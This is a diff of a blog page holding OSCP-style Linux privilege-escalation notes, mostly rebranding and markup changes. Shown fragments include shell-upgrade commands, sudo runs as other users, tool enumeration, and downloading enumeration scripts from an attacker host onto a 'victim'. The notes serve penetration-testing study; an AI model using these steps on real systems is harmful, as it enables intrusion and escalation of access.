@@ -3,21 +3,23 @@
 <head>
         <meta charset="utf-8" />
         <meta name="generator" content="Pelican" />
-        <title>"Linux Privilege Escalation"</title>
+        <title>Linux Privilege Escalation</title>
         <link rel="stylesheet" href="/theme/css/main.css" />
-        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daniel Haggerty's Blog Atom Feed" />
-        <link href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="Daniel Haggerty's Blog RSS Feed" />
+        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Digital Forensics Atom Feed" />
         <meta name="description" content="privesc_linux UPGRADE SHELL python -c 'import pty; pty.spawn("bin/bash")' ctrl-Z stty raw -echo fg Enumerate and run this: which awk perl python..." />
 </head>
 
 <body id="index" class="home">
         <header id="banner" class="body">
-                <h1><a href="/">Daniel Haggerty's Blog</a></h1>
+                <h1><a href="/">Digital Forensics</a></h1>
                 <nav><ul>
-                    <li><a href="/category/dfir.html">DFIR</a></li>
-                    <li><a href="/category/docker.html">Docker</a></li>
-                    <li><a href="/category/network.html">Network+</a></li>
-                    <li class="active"><a href="/category/oscp.html">OSCP</a></li>
+                    <li><a href="/category/android.html">Android</a></li>
+                    <li><a href="/category/cdr.html">CDR</a></li>
+                    <li class="active"><a href="/category/certifications.html">Certifications</a></li>
+                    <li><a href="/category/iphone.html">iPhone</a></li>
+                    <li><a href="/category/mac.html">Mac</a></li>
+                    <li><a href="/category/mail.html">Mail</a></li>
+                    <li><a href="/category/windows.html">Windows</a></li>
                 </ul></nav>
         </header><!-- /#banner -->
 <section id="content" class="body">
@@ -25,7 +27,7 @@
     <header>
       <h1 class="entry-title">
         <a href="/linux-privilege-escalation.html" rel="bookmark"
-           title="Permalink to "Linux Privilege Escalation"">"Linux Privilege Escalation"</a></h1>
+           title="Permalink to Linux Privilege Escalation">Linux Privilege Escalation</a></h1>
     </header>
 
     <div class="entry-content">
@@ -37,8 +39,8 @@
         <address class="vcard author">
                 By                         <a class="url fn" href="/author/daniel-haggerty.html">Daniel Haggerty</a>
         </address>
-<p>In <a href="/category/oscp.html">OSCP</a>.</p>
-<p>tags: <a href="/tag/penetration-testing.html">Penetration Testing</a> <a href="/tag/privilege-escalation.html">Privilege Escalation</a> </p>
+<p>In <a href="/category/certifications.html">Certifications</a>.</p>
+<p>tags: <a href="/tag/oscp.html">OSCP</a> </p>
 </footer><!-- /.post-info -->      <div class="highlight"><pre><span></span><code><span class="n">privesc_linux</span>
 <span class="n">UPGRADE</span> <span class="n">SHELL</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;bin/bash&quot;)&#39;</span>
 <span class="n">ctrl</span><span class="o">-</span><span class="n">Z</span>
@@ -60,9 +62,11 @@ BY HAND
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)</p>
-<p><code>sudo -u anotheruser command run sommand as another user
-sudo -u scriptmanager bash -i #run shell as user scriptmanager
-which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&gt;/dev/null</code></p>
+<div class="highlight"><pre><span></span><code><span class="err">sudo -u anotheruser command run sommand as another user</span>
+<span class="err">sudo -u scriptmanager bash -i #run shell as user scriptmanager</span>
+<span class="err">which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&gt;/dev/null</span>
+</code></pre></div>
+
 <p>DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
@@ -178,21 +182,11 @@ CAP_DAC_READ_SEARCH
   </article>
 </section>
         <section id="extras" class="body">
-                <div class="blogroll">
-                        <h2>links</h2>
-                        <ul>
-                            <li><a href="https://getpelican.com/">Pelican</a></li>
-                            <li><a href="https://www.python.org/">Python.org</a></li>
-                            <li><a href="https://www.docker.com/">Docker</a></li>
-                        </ul>
-                </div><!-- /.blogroll -->
                 <div class="social">
                         <h2>social</h2>
                         <ul>
                             <li><a href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
-                            <li><a href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate">rss feed</a></li>
 
-                            <li><a href="#">Another social link</a></li>
                         </ul>
                 </div><!-- /.social -->
         </section><!-- /#extras -->
